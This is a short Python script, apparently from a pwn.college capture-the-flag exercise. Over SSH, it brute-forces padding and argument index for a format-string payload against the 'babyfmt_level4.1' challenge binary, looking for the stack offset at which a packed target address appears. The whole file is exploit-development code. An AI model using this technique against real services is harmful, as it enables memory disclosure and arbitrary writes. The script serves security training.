import subprocess
import struct

ADDR = 0x4040E0
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

TOTAL = 0x79
sentinel = "XYZ "
prefix = "A" * (TOTAL - len(sentinel)) + sentinel
pad_bytes = b"A" * 8  # allow up to 7 bytes of padding

PAD_RANGE = range(0, 8)
IDX_RANGE = range(30, 120)

for pad in PAD_RANGE:
    for idx in IDX_RANGE:
        fmt = f"{prefix}%{idx}$p".encode()
        payload = fmt + pad_bytes[:pad] + struct.pack("<Q", ADDR)
        res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        out = res.stdout.decode("latin-1", errors="ignore")
        if "0x4040e0" in out:
            print("pad", pad, "idx", idx)
            print(out)
            raise SystemExit

print("not found up to tested range")
